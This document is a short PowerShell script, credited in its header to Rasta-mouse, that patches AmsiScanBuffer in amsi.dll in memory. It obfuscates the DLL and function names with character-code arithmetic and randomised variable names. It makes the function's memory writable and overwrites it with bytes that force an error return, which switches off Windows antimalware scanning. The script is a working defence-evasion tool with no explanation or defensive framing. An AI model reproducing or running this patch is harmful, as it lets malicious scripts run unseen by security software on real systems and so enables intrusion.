#Rasta-mouses Amsi-Scan-Buffer patch \n
$rcxgh = @"
using System;
using System.Runtime.InteropServices;
public class rcxgh {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr uvugcf, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $rcxgh

$rehjkeo = [rcxgh]::LoadLibrary("$(('âm'+'sì'+'.d'+'ll').NormALiZe([CHaR](70*10/10)+[CHAR]([bYTE]0x6f)+[cHAR](102+12)+[ChaR]([BYtE]0x6d)+[Char](68+41-41)) -replace [CHAr](16+76)+[CHar]([bYte]0x70)+[cHAR]([ByTE]0x7b)+[cHar]([BYTE]0x4d)+[cHAr](62+48)+[ChAr](125+69-69))")
$frhfxk = [rcxgh]::GetProcAddress($rehjkeo, "$([cHaR]([bYTe]0x41)+[CHAR](109*32/32)+[Char]([BYtE]0x73)+[CHar](105)+[ChaR]([BYTE]0x53)+[CHAR]([BYTe]0x63)+[cHaR]([BytE]0x61)+[cHAR](110+74-74)+[chAr](66*59/59)+[CHar]([bYTe]0x75)+[CHAr]([BYTe]0x66)+[chAR](102+48-48)+[CHaR](75+26)+[ChaR](114*109/109))")
$p = 0
[rcxgh]::VirtualProtect($frhfxk, [uint32]5, 0x40, [ref]$p)
$jwws = "0xB8"
$btpv = "0x57"
$stry = "0x00"
$klsl = "0x07"
$dvdu = "0x80"
$vtcq = "0xC3"
$pnbyx = [Byte[]] ($jwws,$btpv,$stry,$klsl,+$dvdu,+$vtcq)
[System.Runtime.InteropServices.Marshal]::Copy($pnbyx, 0, $frhfxk, 6)